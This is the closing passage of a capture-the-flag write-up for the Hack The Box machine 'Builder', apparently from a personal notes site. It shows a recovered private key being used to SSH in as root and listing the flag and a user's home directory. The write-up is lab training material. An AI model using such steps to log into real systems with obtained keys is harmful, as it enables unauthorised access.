<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="bash" data-theme="catppuccin-latte catppuccin-mocha"><code data-language="bash" data-theme="catppuccin-latte catppuccin-mocha" style="display:grid;"><span data-line><span style="--shiki-light:#1E66F5;--shiki-dark:#89B4FA;--shiki-light-font-style:italic;--shiki-dark-font-style:italic;">kali@kali:~/htb$</span><span style="--shiki-light:#40A02B;--shiki-dark:#A6E3A1;"> vim</span><span style="--shiki-light:#40A02B;--shiki-dark:#A6E3A1;"> builder-key</span></span>
<span data-line><span style="--shiki-light:#1E66F5;--shiki-dark:#89B4FA;--shiki-light-font-style:italic;--shiki-dark-font-style:italic;">kali@kali:~/htb$</span><span style="--shiki-light:#40A02B;--shiki-dark:#A6E3A1;"> chmod</span><span style="--shiki-light:#FE640B;--shiki-dark:#FAB387;"> 600</span><span style="--shiki-light:#40A02B;--shiki-dark:#A6E3A1;"> builder-key</span></span>
<span data-line><span style="--shiki-light:#1E66F5;--shiki-dark:#89B4FA;--shiki-light-font-style:italic;--shiki-dark-font-style:italic;">kali@kali:~/htb$</span><span style="--shiki-light:#40A02B;--shiki-dark:#A6E3A1;"> ssh</span><span style="--shiki-light:#40A02B;--shiki-dark:#A6E3A1;"> -i</span><span style="--shiki-light:#40A02B;--shiki-dark:#A6E3A1;"> builder-key</span><span style="--shiki-light:#40A02B;--shiki-dark:#A6E3A1;"> root@builder.htb</span></span>
<span data-line><span style="--shiki-light:#1E66F5;--shiki-dark:#89B4FA;--shiki-light-font-style:italic;--shiki-dark-font-style:italic;">root@builder:~#</span><span style="--shiki-light:#40A02B;--shiki-dark:#A6E3A1;"> ls</span></span></code></pre></figure>
<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="shellsession" data-theme="catppuccin-latte catppuccin-mocha"><code data-language="shellsession" data-theme="catppuccin-latte catppuccin-mocha" style="display:grid;"><span data-line><span style="--shiki-light:#4C4F69;--shiki-dark:#CDD6F4;">root.txt</span></span></code></pre></figure>
<p>If we look in the directory <code>/home/jennifer</code> we will find:</p>
<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="bash" data-theme="catppuccin-latte catppuccin-mocha"><code data-language="bash" data-theme="catppuccin-latte catppuccin-mocha" style="display:grid;"><span data-line><span style="--shiki-light:#1E66F5;--shiki-dark:#89B4FA;--shiki-light-font-style:italic;--shiki-dark-font-style:italic;">root@builder:~#</span><span style="--shiki-light:#40A02B;--shiki-dark:#A6E3A1;"> ls</span><span style="--shiki-light:#40A02B;--shiki-dark:#A6E3A1;"> -la</span><span style="--shiki-light:#40A02B;--shiki-dark:#A6E3A1;"> /home/jennifer/</span></span></code></pre></figure>
<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="shellsession" data-theme="catppuccin-latte catppuccin-mocha"><code data-language="shellsession" data-theme="catppuccin-latte catppuccin-mocha" style="display:grid;"><span data-line><span style="--shiki-light:#4C4F69;--shiki-dark:#CDD6F4;">total 28</span></span>
<span data-line><span style="--shiki-light:#4C4F69;--shiki-dark:#CDD6F4;">drwxr-x--- 3 jennifer jennifer 4096 Feb  9 15:45 .</span></span>
<span data-line><span style="--shiki-light:#4C4F69;--shiki-dark:#CDD6F4;">drwxr-xr-x 3 root     root     4096 Feb  9 15:45 ..</span></span>
<span data-line><span style="--shiki-light:#4C4F69;--shiki-dark:#CDD6F4;">lrwxrwxrwx 1 root     root        9 Feb  9 14:31 .bash_history -> /dev/null</span></span>
<span data-line><span style="--shiki-light:#4C4F69;--shiki-dark:#CDD6F4;">-rw-r--r-- 1 jennifer jennifer  220 Jan  6  2022 .bash_logout</span></span>
<span data-line><span style="--shiki-light:#4C4F69;--shiki-dark:#CDD6F4;">-rw-r--r-- 1 jennifer jennifer 3771 Jan  6  2022 .bashrc</span></span>
<span data-line><span style="--shiki-light:#4C4F69;--shiki-dark:#CDD6F4;">drwx------ 2 jennifer jennifer 4096 Feb  9 15:45 .cache</span></span>
<span data-line><span style="--shiki-light:#4C4F69;--shiki-dark:#CDD6F4;">-rw-r--r-- 1 jennifer jennifer  807 Jan  6  2022 .profile</span></span>
<span data-line><span style="--shiki-light:#4C4F69;--shiki-dark:#CDD6F4;">-rw-r----- 1 root     jennifer   33 Mar  8 05:02 user.txt</span></span></code></pre></figure></article></div><div class="right sidebar"><div class="graph"><h3>Graph View</h3><div class="graph-outer"><div id="graph-container" data-cfg="{&quot;drag&quot;:true,&quot;zoom&quot;:true,&quot;depth&quot;:1,&quot;scale&quot;:1.1,&quot;repelForce&quot;:0.5,&quot;centerForce&quot;:0.3,&quot;linkDistance&quot;:30,&quot;fontSize&quot;:0.6,&quot;opacityScale&quot;:1,&quot;showTags&quot;:true,&quot;removeTags&quot;:[],&quot;focusOnHover&quot;:false}"></div><svg version="1.1" id="global-graph-icon" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" viewBox="0 0 55 55" fill="currentColor" xml:space="preserve"><path d="M49,0c-3.309,0-6,2.691-6,6c0,1.035,0.263,2.009,0.726,2.86l-9.829,9.829C32.542,17.634,30.846,17,29,17
	s-3.542,0.634-4.898,1.688l-7.669-7.669C16.785,10.424,17,9.74,17,9c0-2.206-1.794-4-4-4S9,6.794,9,9s1.794,4,4,4
	c0.74,0,1.424-0.215,2.019-0.567l7.669,7.669C21.634,21.458,21,23.154,21,25s0.634,3.542,1.688,4.897L10.024,42.562
	C8.958,41.595,7.549,41,6,41c-3.309,0-6,2.691-6,6s2.691,6,6,6s6-2.691,6-6c0-1.035-0.263-2.009-0.726-2.86l12.829-12.829
	c1.106,0.86,2.44,1.436,3.898,1.619v10.16c-2.833,0.478-5,2.942-5,5.91c0,3.309,2.691,6,6,6s6-2.691,6-6c0-2.967-2.167-5.431-5-5.91
	v-10.16c1.458-0.183,2.792-0.759,3.898-1.619l7.669,7.669C41.215,39.576,41,40.26,41,41c0,2.206,1.794,4,4,4s4-1.794,4-4
	s-1.794-4-4-4c-0.74,0-1.424,0.215-2.019,0.567l-7.669-7.669C36.366,28.542,37,26.846,37,25s-0.634-3.542-1.688-4.897l9.665-9.665
	C46.042,11.405,47.451,12,49,12c3.309,0,6-2.691,6-6S52.309,0,49,0z M11,9c0-1.103,0.897-2,2-2s2,0.897,2,2s-0.897,2-2,2
	S11,10.103,11,9z M6,51c-2.206,0-4-1.794-4-4s1.794-4,4-4s4,1.794,4,4S8.206,51,6,51z M33,49c0,2.206-1.794,4-4,4s-4-1.794-4-4
	s1.794-4,4-4S33,46.794,33,49z M29,31c-3.309,0-6-2.691-6-6s2.691-6,6-6s6,2.691,6,6S32.309,31,29,31z M47,41c0,1.103-0.897,2-2,2
	s-2-0.897-2-2s0.897-2,2-2S47,39.897,47,41z M49,10c-2.206,0-4-1.794-4-4s1.794-4,4-4s4,1.794,4,4S51.206,10,49,10z"></path></svg></div><div id="global-graph-outer"><div id="global-graph-container" data-cfg="{&quot;drag&quot;:true,&quot;zoom&quot;:true,&quot;depth&quot;:-1,&quot;scale&quot;:0.9,&quot;repelForce&quot;:0.5,&quot;centerForce&quot;:0.3,&quot;linkDistance&quot;:30,&quot;fontSize&quot;:0.6,&quot;opacityScale&quot;:1,&quot;showTags&quot;:true,&quot;removeTags&quot;:[],&quot;focusOnHover&quot;:true}"></div></div></div><div class="toc desktop-only"><button type="button" id="toc" class><h3>Table of Contents</h3><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="fold"><polyline points="6 9 12 15 18 9"></polyline></svg></button><div id="toc-content"><ul class="overflow"><li class="depth-0"><a href="#builder" data-for="builder">Builder</a></li><li class="depth-0"><a href="#enumeration" data-for="enumeration">Enumeration</a></li><li class="depth-0"><a href="#foothold" data-for="foothold">Foothold</a></li><li class="depth-2"><a href="#download-jenkins-cli" data-for="download-jenkins-cli">Download jenkins-cli</a></li><li class="depth-2"><a href="#get-commands-list" data-for="get-commands-list">Get Commands list</a></li><li class="depth-2"><a href="#execute-command-list" data-for="execute-command-list">Execute Command list</a></li><li class="depth-2"><a href="#getting-access-to-user" data-for="getting-access-to-user">Getting Access to user</a></li><li class="depth-0"><a href="#user" data-for="user">User</a></li><li class="depth-0"><a href="#privilege-escalation" data-for="privilege-escalation">Privilege Escalation</a></li></ul></div></div><div class="backlinks"><h3>Backlinks</h3><ul class="overflow"><li><a href="../../../everything/Cyber/011---HTB" class="internal">011 - HTB</a></li></ul></div></div></div><footer class><hr/><p>Created with <a href="https://quartz.jzhao.xyz/">Quartz v4.2.3</a> © 2024</p><ul><li><a href="https://github.com/jackyzha0/quartz">GitHub</a></li><li><a href="https://discord.gg/cRFFHYye7t">Discord Community</a></li></ul></footer></div></body><script src="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.16.9/contrib/copy-tex.min.js" type="application/javascript"></script><script type="application/javascript">function c(){let t=this.parentElement;t.classList.toggle("is-collapsed");let l=t.classList.contains("is-collapsed")?this.scrollHeight:t.scrollHeight;t.style.maxHeight=l+"px";let o=t,e=t.parentElement;for(;e;){if(!e.classList.contains("callout"))return;let n=e.classList.contains("is-collapsed")?e.scrollHeight:e.scrollHeight+o.scrollHeight;e.style.maxHeight=n+"px",o=e,e=e.parentElement}}function i(){let t=document.getElementsByClassName("callout is-collapsible");for(let s of t){let l=s.firstElementChild;if(l){l.addEventListener("click",c),window.addCleanup(()=>l.removeEventListener("click",c));let e=s.classList.contains("is-collapsed")?l.scrollHeight:s.scrollHeight;s.style.maxHeight=e+"px"}}}document.addEventListener("nav",i);window.addEventListener("resize",i);
</script><script type="module">
          let mermaidImport = undefined
          document.addEventListener('nav', async () => {
            if (document.querySelector("code.mermaid")) {
              mermaidImport ||= await import('https://cdnjs.cloudflare.com/ajax/libs/mermaid/10.7.0/mermaid.esm.min.mjs')
              const mermaid = mermaidImport.default
              const darkMode = document.documentElement.getAttribute('saved-theme') === 'dark'
              mermaid.initialize({
                startOnLoad: false,
                securityLevel: 'loose',
                theme: darkMode ? 'dark' : 'default'
              })

              await mermaid.run({
                querySelector: '.mermaid'
              })
            }
          });
          </script><script src="../../../postscript.js" type="module"></script></html>